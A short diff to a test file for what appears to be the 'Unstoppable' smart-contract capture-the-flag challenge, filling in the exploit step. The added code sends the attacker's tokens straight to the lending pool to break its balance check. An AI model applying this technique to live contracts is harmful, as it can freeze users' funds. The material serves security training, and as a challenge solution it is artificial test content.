@@ -39,7 +39,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker)
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+
     });
 
     after(async function () {
